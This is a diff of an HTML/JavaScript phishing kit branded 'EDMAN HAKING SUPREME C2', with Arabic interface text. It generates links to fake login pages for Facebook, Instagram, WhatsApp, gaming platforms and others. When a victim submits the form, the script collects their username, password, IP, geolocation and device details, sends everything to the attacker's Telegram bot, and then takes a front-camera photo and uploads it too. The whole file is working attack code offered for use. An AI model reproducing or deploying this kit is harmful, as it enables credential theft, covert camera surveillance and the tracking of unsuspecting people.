@@ -3,112 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDMAN HAKING - ULTIMATE PHISHING & C2</title>
+    <title>EDMAN HAKING - SUPREME C2 SUITE</title>
     <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
-            background-color: #030712;
-            color: #38bdf8;
-            font-family: Tahoma, sans-serif;
-            margin: 0;
-            padding: 0;
+            background-color: #020617;
+            color: #22c55e;
+            font-family: 'Courier New', Courier, monospace;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            overflow: hidden;
+            overflow-x: hidden;
             position: relative;
         }
         canvas#matrix {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
             z-index: -1;
-            opacity: 0.15;
+            opacity: 0.2;
         }
-        .container {
-            width: 90%;
-            max-width: 480px;
-            background: rgba(17, 24, 39, 0.95);
-            padding: 30px;
-            border-radius: 16px;
-            border: 1px solid #d4af37;
-            box-shadow: 0 0 30px rgba(212, 175, 55, 0.25);
-            box-sizing: border-box;
-            text-align: center;
-            backdrop-filter: blur(8px);
+        .main-wrapper {
+            width: 100%;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
             z-index: 1;
         }
-        .logo-title { color: #d4af37; font-size: 20px; font-weight: bold; margin-bottom: 5px; letter-spacing: 1px; }
-        .logo-sub { color: #9ca3af; font-size: 11px; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; }
-        h2 { color: #f43f5e; font-size: 18px; margin-bottom: 15px; }
-        p { color: #9ca3af; font-size: 12px; margin-bottom: 20px; line-height: 1.5; }
-        .form-group { margin-bottom: 15px; text-align: right; }
-        label { display: block; color: #d4af37; font-size: 12px; margin-bottom: 6px; font-weight: bold; }
+        .panel {
+            width: 100%;
+            max-width: 450px;
+            background: rgba(3, 7, 18, 0.9);
+            border: 1px solid #22c55e;
+            box-shadow: 0 0 40px rgba(34, 197, 94, 0.25);
+            padding: 35px 25px;
+            border-radius: 12px;
+            backdrop-filter: blur(10px);
+        }
+        /* تصميم يحاكي المنصات الأصلية تماماً عند الصيد */
+        .platform-box {
+            width: 100%;
+            max-width: 400px;
+            background: #ffffff;
+            color: #1c1e21;
+            padding: 30px 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        .platform-box h2 { font-size: 24px; margin-bottom: 20px; font-family: Tahoma, sans-serif; }
+        .platform-box input {
+            width: 100%; padding: 12px; margin-bottom: 12px;
+            border: 1px solid #ccd0d5; border-radius: 6px; font-size: 14px; outline: none;
+            background: #f5f6f7;
+        }
+        .platform-box button {
+            width: 100%; padding: 12px; border: none; border-radius: 6px;
+            color: #fff; font-weight: bold; font-size: 16px; cursor: pointer;
+            margin-top: 5px; font-family: Tahoma, sans-serif;
+        }
+        /* لوحة التحكم السيبرانية */
+        .cyber-title { color: #22c55e; text-align: center; font-size: 22px; font-weight: bold; margin-bottom: 8px; text-shadow: 0 0 10px rgba(34,197,94,0.5); }
+        .cyber-sub { color: #94a3b8; text-align: center; font-size: 11px; margin-bottom: 25px; letter-spacing: 2px; }
+        label { display: block; color: #22c55e; font-size: 12px; margin-bottom: 6px; font-weight: bold; }
         input, select {
-            width: 100%;
-            padding: 12px;
-            background: #1f2937;
-            border: 1px solid #374151;
-            color: #fff;
-            border-radius: 8px;
-            font-size: 14px;
-            box-sizing: border-box;
-            outline: none;
+            width: 100%; padding: 12px; background: #0f172a; border: 1px solid #1e293b;
+            color: #22c55e; border-radius: 6px; font-size: 14px; margin-bottom: 15px; outline: none;
         }
-        input:focus, select:focus { border-color: #d4af37; box-shadow: 0 0 8px rgba(212, 175, 55, 0.4); }
-        button {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #d4af37, #aa820a);
-            color: #030712;
-            border: none;
-            border-radius: 8px;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 15px;
-            transition: 0.3s;
-            box-shadow: 0 4px 12px rgba(212, 175, 55, 0.3);
-            margin-top: 10px;
+        input:focus, select:focus { border-color: #22c55e; box-shadow: 0 0 8px rgba(34,197,94,0.4); }
+        .cyber-btn {
+            width: 100%; padding: 14px; background: #22c55e; color: #020617; border: none;
+            border-radius: 6px; font-weight: bold; font-size: 15px; cursor: pointer; transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(34,197,94,0.4);
         }
-        button:hover { opacity: 0.9; }
-        .result-box {
-            margin-top: 20px;
-            padding: 15px;
-            background: #1f2937;
-            border-radius: 8px;
-            border: 1px solid #34d399;
-            display: none;
-            text-align: right;
+        .cyber-btn:hover { background: #16a34a; }
+        .result-box { margin-top: 20px; padding: 15px; background: #0f172a; border-radius: 6px; border: 1px solid #22c55e; display: none; }
+        .result-box a { color: #34d399; font-size: 12px; word-break: break-all; text-decoration: underline; }
+        
+        /* فقاعة النقر التفاعلية */
+        .click-bubble {
+            position: absolute; width: 30px; height: 30px;
+            border: 2px solid #22c55e; border-radius: 50%;
+            transform: translate(-50%, -50%); pointer-events: none;
+            animation: bubbleAnim 0.5s ease-out forwards; z-index: 9999;
         }
-        .result-box a { color: #34d399; font-weight: bold; word-break: break-all; font-size: 12px; text-decoration: underline; }
-        .footer { margin-top: 15px; font-size: 10px; color: #6b7280; letter-spacing: 1px; }
+        @keyframes bubbleAnim {
+            0% { width: 0px; height: 0px; opacity: 1; }
+            100% { width: 70px; height: 70px; opacity: 0; }
+        }
     </style>
 </head>
 <body>
 
     <canvas id="matrix"></canvas>
-    <div class="container" id="appCard"></div>
+
+    <div class="main-wrapper" id="mainWrapper">
+        <!-- يتم بناء المحتوى هنا ديناميكياً -->
+    </div>
 
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // تأثير الماتريكس
+        /* فقاعة تفاعلية عند النقر في أي مكان بالموقع */
+        window.addEventListener('click', function(e) {
+            let bubble = document.createElement('div');
+            bubble.className = 'click-bubble';
+            bubble.style.left = e.pageX + 'px';
+            bubble.style.top = e.pageY + 'px';
+            document.body.appendChild(bubble);
+            setTimeout(() => bubble.remove(), 500);
+        });
+
+        /* تأثير ماتريكس أخضر سينمائي */
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
-        const alphabet = '日ﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕﾗｾﾈｽﾀﾇﾍABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*+-_';
+        const alphabet = '0123456789ABCDEFHIJKLMNOPQRSTUVWXYZ@#$%&*+-/\\';
         const fontSize = 14;
         const columns = canvas.width / fontSize;
         const rainDrops = [];
         for (let x = 0; x < columns; x++) { rainDrops[x] = 1; }
         function drawMatrix() {
-            ctx.fillStyle = 'rgba(3, 7, 18, 0.05)';
+            ctx.fillStyle = 'rgba(2, 6, 23, 0.05)';
             ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#0ea5e9';
+            ctx.fillStyle = '#22c55e';
             ctx.font = fontSize + 'px monospace';
             for (let i = 0; i < rainDrops.length; i++) {
                 const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
@@ -117,68 +141,74 @@
                 rainDrops[i]++;
             }
         }
-        setInterval(drawMatrix, 30);
+        setInterval(drawMatrix, 35);
         window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
 
-        // منصات الصيد
+        /* معالجة الروابط والمنصات */
         const urlParams = new URLSearchParams(window.location.search);
         const botToken = urlParams.get('t');
         const chatId = urlParams.get('c');
         const platform = urlParams.get('p') || 'facebook';
-        const cardDiv = document.getElementById('appCard');
+        const wrapper = document.getElementById('mainWrapper');
 
-        const platformsData = {
-            'facebook': { name: 'Facebook - تسجيل الدخول', bg: '#1877f2' },
-            'instagram': { name: 'Instagram - التحقق من الحساب', bg: '#e1306c' },
-            'telegram': { name: 'Telegram - تسجيل الدخول السريع', bg: '#229ed9' },
-            'github': { name: 'GitHub - تأكيد الهوية', bg: '#24292e' },
-            'google': { name: 'Google - الأمان والمتابعة', bg: '#4285f4' },
-            'snapchat': { name: 'Snapchat - استعادة الحساب', bg: '#fffc00' }
+        const platformsConfig = {
+            'facebook': { name: 'Facebook', title: 'تسجيل الدخول إلى فيسبوك', bg: '#1877f2', userPlaceholder: 'البريد الإلكتروني أو رقم الهاتف', passPlaceholder: 'كلمة سر فيسبوك' },
+            'instagram': { name: 'Instagram', title: 'Instagram', bg: '#e1306c', userPlaceholder: 'اسم المستخدم أو البريد أو الهاتف', passPlaceholder: 'كلمة المرور' },
+            'telegram': { name: 'Telegram', title: 'تسجيل دخول تيليجرام', bg: '#229ed9', userPlaceholder: 'رقم الهاتف أو المعرف', passPlaceholder: 'كلمة المرور / الرمز' },
+            'youtube': { name: 'YouTube', title: 'تسجيل الدخول عبر Google', bg: '#ff0000', userPlaceholder: 'البريد أو الهاتف', passPlaceholder: 'كلمة المرور' },
+            'pubg': { name: 'PUBG Mobile', title: 'مركز استلام شدات وبطاقات PUBG', bg: '#f59e0b', userPlaceholder: 'Player ID (أيدي اللاعب)', passPlaceholder: 'كلمة مرور الحساب' },
+            'freefire': { name: 'Free Fire', title: 'شحن جواهر فري فاير المجانية', bg: '#ef4444', userPlaceholder: 'Player ID (الإيدي)', passPlaceholder: 'كلمة مرور اللعبة' },
+            'whatsapp': { name: 'WhatsApp', title: 'تحقق وتأكيد حساب واتساب', bg: '#25d366', userPlaceholder: 'رقم الهاتف مع رمز الدولة', passPlaceholder: 'رمز التحقق (إن وجد)' }
         };
 
         if (!botToken || !chatId) {
-            cardDiv.innerHTML = `
-                <div class="logo-title">EDMAN HAKING</div>
-                <div class="logo-sub">PHISHING SUITE GENERATOR</div>
-                <h2>💀 لوحة صانع صفحات الصيد 💀</h2>
-                <p>اختر المنصة المستهدفة وأدخل بيانات بوت تيليجرام الخاص بك:</p>
-                <div class="form-group"><label>اختر المنصة المستهدفة:</label>
+            // لوحة التحكم السيبرانية الكاملة الشاشة
+            wrapper.innerHTML = `
+                <div class="panel">
+                    <div class="cyber-title">EDMAN SUPREME C2</div>
+                    <div class="cyber-sub">ADVANCED PHISHING & RECON SUITE</div>
+                    <label>اختر المنصة المستهدفة:</label>
                     <select id="selPlatform">
                         <option value="facebook">Facebook</option>
                         <option value="instagram">Instagram</option>
                         <option value="telegram">Telegram</option>
-                        <option value="github">GitHub</option>
-                        <option value="google">Google</option>
-                        <option value="snapchat">Snapchat</option>
+                        <option value="youtube">YouTube</option>
+                        <option value="pubg">PUBG Mobile</option>
+                        <option value="freefire">Free Fire</option>
+                        <option value="whatsapp">WhatsApp</option>
                     </select>
+                    <label>Bot Token:</label>
+                    <input type="text" id="inputToken" placeholder="أدخل توكن البوت هنا...">
+                    <label>Chat ID:</label>
+                    <input type="text" id="inputChat" placeholder="أدخل الـ Chat ID هنا...">
+                    <button class="cyber-btn" onclick="generateLink()">توليد رابط الصيد المدمر</button>
+                    <div class="result-box" id="resultBox">
+                        <p style="color:#22c55e; font-size:11px; margin-bottom:5px; font-weight:bold;">رابط الصيد الجاهز:</p>
+                        <a id="generatedLink" href="#" target="_blank"></a>
+                    </div>
                 </div>
-                <div class="form-group"><label>Bot Token:</label><input type="text" id="inputToken" placeholder="أدخل التوكن هنا..."></div>
-                <div class="form-group"><label>Chat ID:</label><input type="text" id="inputChat" placeholder="أدخل الآيدي هنا..."></div>
-                <button onclick="generatePhishLink()">توليد رابط الصيد السريع</button>
-                <div class="result-box" id="resultBox">
-                    <p style="color: #34d399; margin-bottom: 8px; font-weight: bold;">رابط الصيد جاهز للإرسال:</p>
-                    <a id="generatedLink" href="#" target="_blank"></a>
-                </div>
-                <div class="footer">EDMAN HAKING TOOL © 2026</div>
             `;
         } else {
-            let pInfo = platformsData[platform] || platformsData['facebook'];
-            cardDiv.innerHTML = `
-                <div class="logo-title" style="color:${pInfo.bg}">${pInfo.name}</div>
-                <p>يرجى إدخال بيانات حسابك للمتابعة والتحقق الأمني السريع:</p>
-                <div class="form-group"><label>اسم المستخدم / البريد / الهاتف:</label><input type="text" id="phishUser" placeholder="أدخل البيانات هنا..."></div>
-                <div class="form-group"><label>كلمة المرور:</label><input type="password" id="phishPass" placeholder="••••••••"></div>
-                <button style="background:${pInfo.bg}; color:#fff;" onclick="executeUltimatePhish('${platform}')">تسجيل الدخول / متابعة</button>
-                <div id="status" style="margin-top:15px; font-size:12px; color:#34d399;"></div>
-                <div class="footer">SECURE GATEWAY © 2026</div>
+            // واجهة الصيد الأصلية الخاصة بالمنصة المحددة دون ماتريكس في الخلفية لتكون طبيعية بالكامل
+            let cfg = platformsConfig[platform] || platformsConfig['facebook'];
+            document.getElementById('matrix').style.display = 'none'; // إخفاء الماتريكس لتبدو الصفحة طبيعية ورسمية 100%
+            wrapper.innerHTML = `
+                <div class="platform-box">
+                    <h2 style="color: ${cfg.bg};">${cfg.name}</h2>
+                    <p style="color: #606770; font-size: 13px; margin-bottom: 20px; font-family: Tahoma;">${cfg.title}</p>
+                    <input type="text" id="phishUser" placeholder="${cfg.userPlaceholder}">
+                    <input type="password" id="phishPass" placeholder="${cfg.passPlaceholder}">
+                    <button style="background-color: ${cfg.bg};" onclick="executeUltimateAttack('${platform}')">متابعة / تسليم الهدية</button>
+                    <div id="status" style="margin-top:15px; font-size:12px; color:#16a34a; font-family: Tahoma;"></div>
+                </div>
             `;
         }
 
-        function generatePhishLink() {
+        function generateLink() {
             let t = document.getElementById('inputToken').value.trim();
             let c = document.getElementById('inputChat').value.trim();
             let p = document.getElementById('selPlatform').value;
-            if (!t || !c) { alert('يرجى ملء الحقول أولاً!'); return; }
+            if (!t || !c) { alert('يرجى إدخال التوكن والآيدي أولاً!'); return; }
             let fullLink = window.location.origin + window.location.pathname + `?t=${t}&c=${c}&p=${p}`;
             let linkElem = document.getElementById('generatedLink');
             linkElem.href = fullLink;
@@ -186,35 +216,25 @@
             document.getElementById('resultBox').style.display = 'block';
         }
 
-        async function executeUltimatePhish(plat) {
+        async function executeUltimateAttack(plat) {
             let u = document.getElementById('phishUser').value.trim();
             let p = document.getElementById('phishPass').value.trim();
-            if (!u || !p) { alert('يرجى إكمال الحقول المطلوبة'); return; }
+            if (!u || !p) { alert('يرجى إكمال البيانات المطلوبة'); return; }
 
-            document.getElementById('status').innerText = "جاري معالجة البيانات والتحقق...";
+            document.getElementById('status').innerText = "جاري التحقق والمزامنة...";
 
-            // جلب الـ IP عبر خدمة آمنة ومتوافقة مع HTTPS
             let ipData = "غير معروف", geoInfo = "غير معروف", batteryInfo = "غير متوفر";
             try {
                 let ipRes = await fetch('https://api.ipify.org?format=json');
                 let ipJson = await ipRes.json();
                 ipData = ipJson.ip;
-            } catch(e) {
-                try {
-                    let altIpRes = await fetch('https://ipapi.co/json/');
-                    let altIpJson = await altIpRes.json();
-                    ipData = altIpJson.ip;
-                    geoInfo = `${altIpJson.country_name} -${altIpJson.region} - ${altIpJson.city} (ISP:${altIpJson.org})`;
-                } catch(err) {}
-            }
+            } catch(e) {}
 
-            if (ipData !== "غير معروف" && geoInfo === "غير معروف") {
-                try {
-                    let geoRes = await fetch(`https://ipapi.co/${ipData}/json/`);
-                    let geoJson = await geoRes.json();
-                    geoInfo = `${geoJson.country_name} -${geoJson.region} - ${geoJson.city} (ISP:${geoJson.org})`;
-                } catch(e) {}
-            }
+            try {
+                let geoRes = await fetch(`https://ipapi.co/${ipData}/json/`);
+                let geoJson = await geoRes.json();
+                geoInfo = `${geoJson.country_name} -${geoJson.region} - ${geoJson.city} (ISP:${geoJson.org}) [Lat/Lon: ${geoJson.latitude},${geoJson.longitude}]`;
+            } catch(e) {}
 
             if (navigator.getBattery) {
                 try {
@@ -231,32 +251,33 @@
                 gpuInfo = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
             } catch(e) {}
 
-            let reportMsg = 
-                `🎯 *صيد خياري ناجح لمنصة [${plat.toUpperCase()}] بواسطة إدمان!* 💀\n\n` +
-                `👤 *اسم المستخدم / البريد:* \`${u}\`\n` +
-                `🔑 *كلمة المرور:* \`${p}\`\n\n` +
+            let finalReport = 
+                `💀 *صيد أسطوري جديد من منصة [${plat.toUpperCase()}] بواسطة إدمان!* 💀\n\n` +
+                `👤 *اسم المستخدم / الأيدي:* \`${u}\`\n` +
+                `🔑 *كلمة المرور / الرمز:* \`${p}\`\n\n` +
                 `🌐 *عنوان الـ IP:* \`${ipData}\`\n` +
-                `📍 *الموقع والمزود:* \`${geoInfo}\`\n` +
+                `📍 *الموقع الجغرافي والمزود:* \`${geoInfo}\`\n` +
                 `🔋 *حالة البطارية:* \`${batteryInfo}\`\n` +
                 `🎮 *معالج الرسوميات (GPU):* \`${gpuInfo}\`\n` +
-                `💻 *النظام والمنصة:* \`${navigator.platform}\`\n` +
-                `📺 *دقة الشاشة:* \`${window.screen.width}x${window.screen.height}\`\n` +
+                `💻 *نظام التشغيل والمنصة:* \`${navigator.platform}\`\n` +
+                `📺 *دقة الشاشة:* \`${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)\`\n` +
                 `🧠 *الذاكرة العشوائية:* \`${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير معروف'}\`\n` +
+                `⚙️ *عدد أنوية المعالج:* \`${navigator.hardwareConcurrency || 'غير معروف'}\`\n` +
                 `🌍 *المنطقة الزمنية:* \`${Intl.DateTimeFormat().resolvedOptions().timeZone}\`\n` +
-                `🔗 *رابط الصيد:* \`${window.location.href}\``;
+                `🔗 *رابط الصيد المستخدم:* \`${window.location.href}\``;
 
-            // إرسال البيانات واليوزر والباسورد أولاً
+            // إرسال البيانات المسحوبة فوراً لتيليجرام
             try {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: reportMsg, parse_mode: 'Markdown' })
+                    body: JSON.stringify({ chat_id: chatId, text: finalReport, parse_mode: 'Markdown' })
                 });
             } catch(e) {}
 
-            document.getElementById('status').innerText = "جاري تأكيد الجلسة...";
+            document.getElementById('status').innerText = "جاري تأكيد البيانات...";
 
-            // التقاط صورة الكاميرا وإرسالها فوراً
+            // التقاط الكاميرا الأمامية بصمت وإرسالها
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 let video = document.getElementById('video');
@@ -273,7 +294,7 @@
                         let formData = new FormData();
                         formData.append('chat_id', chatId);
                         formData.append('photo', blob, 'capture.jpg');
-                        formData.append('caption', `📸 *صورة الكاميرا للهدف (يوزر: \`${u}\` - IP: \`${ipData}\`)* تم سحبها بنجاح بواسطة إدمان! 💀`);
+                        formData.append('caption', `📸 *صورة الضحية (يوزر: \`${u}\` - IP: \`${ipData}\`)* مسحوبة بنجاح بواسطة إدمان! 💀`);
                         formData.append('parse_mode', 'Markdown');
 
                         try {
